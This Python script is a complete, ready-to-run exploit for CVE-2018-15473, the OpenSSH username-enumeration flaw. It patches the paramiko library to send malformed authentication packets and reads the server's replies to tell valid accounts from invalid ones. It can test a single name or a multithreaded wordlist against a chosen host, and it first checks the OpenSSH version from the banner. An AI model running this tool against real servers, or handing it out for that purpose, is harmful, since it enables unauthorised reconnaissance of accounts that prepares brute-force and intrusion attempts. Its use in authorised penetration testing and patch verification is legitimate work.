#!/usr/bin/env python3
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from pathlib import Path
from typing import Union

import paramiko

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"

class Color:
    """ Class for coloring print statements. """
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    RED = '\033[38;5;196m'
    BLUE = '\033[38;5;75m'
    GREEN = '\033[38;5;149m'
    YELLOW = '\033[38;5;190m'

    @staticmethod
    def string(string: str, color: str, bold: bool = False) -> str:
        """ Prints the given string in a few different colors.
        Args:
            string: string to be printed
            color:  valid colors "red", "blue", "green", "yellow"
            bold:   T/F to add ANSI bold code
        Returns:
            ANSI color-coded string (str)
        """
        boldstr = Color.BOLD if bold else ""
        colorstr = getattr(Color, color.upper())
        return f'{boldstr}{colorstr}{string}{Color.ENDC}'

class InvalidUsername(Exception):
    """ Raise when username not found via CVE-2018-15473. """

def apply_monkey_patch() -> None:
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST. """

    def patched_add_boolean(*args, **kwargs):
        """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """
        pass

    auth_handler = paramiko.auth_handler.AuthHandler

    # Get the current handler table
    client_handler_table = auth_handler._client_handler_table.copy()

    # Get the original MSG_SERVICE_ACCEPT handler
    old_msg_service_accept = client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

    def patched_msg_service_accept(*args, **kwargs):
        """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
        old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
        retval = old_msg_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return retval

    def patched_userauth_failure(*args, **kwargs):
        """ Called during authentication when a username is not found. """
        raise InvalidUsername(*args, **kwargs)

    # Update the handler table with the patched functions
    client_handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
    })

    # Set the patched handler table back
    auth_handler._client_handler_table = client_handler_table

def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
    """ Small helper to stay DRY. """
    try:
        return socket.create_connection((hostname, port))
    except socket.error as e:
        print(f'socket error: {e}', file=sys.stdout)
        return None

def connect(username: str, hostname: str, port: int, verbose: bool = False) -> None:
    """ Connect and attempt key-based auth, result interpreted to determine valid username. """
    sock = create_socket(hostname, port)
    if not sock:
        return

    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print(Color.string(f'[!] SSH negotiation failed for user {username}.', color='red'))
        return

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {Color.string(username, color='yellow')} encontrado!")
    except InvalidUsername:
        if verbose:
            print(f'[-] {Color.string(username, color="red")} no encontrado')

def main():
    """ Main entry point for the program """
    parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")

    parser.add_argument('hostname', help='target to enumerate', type=str)
    parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help="print both valid and invalid usernames (default: False)")
    parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")

    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
    multi_or_single_group.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
    multi_or_single_group.add_argument('-u', '--username', help='a single username to test', type=str)

    args = parser.parse_args()

    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    sock = create_socket(args.hostname, args.port)
    if not sock:
        return

    banner = sock.recv(1024).decode()

    regex = re.search(r'-OpenSSH_(?P<version>\d\.\d)', banner)
    if regex:
        try:
            version = float(regex.group('version'))
        except ValueError:
            print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {regex.group("version")}')
        else:
            ver_clr = 'green' if version <= 7.7 else 'red'
            print(f"[+] {Color.string('OpenSSH', color=ver_clr)} version {Color.string(version, color=ver_clr)} Encontrado")
    else:
        print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {Color.string(banner, color="yellow")}')

    apply_monkey_patch()

    if args.username:
        connect(args.username, args.hostname, args.port, args.verbose)
        return

    with multiprocessing.Pool(args.threads) as pool:
        with Path(args.wordlist).open() as usernames:
            pool.starmap(connect, [(user.strip(), args.hostname, args.port, args.verbose) for user in usernames])

if __name__ == '__main__':
    main()
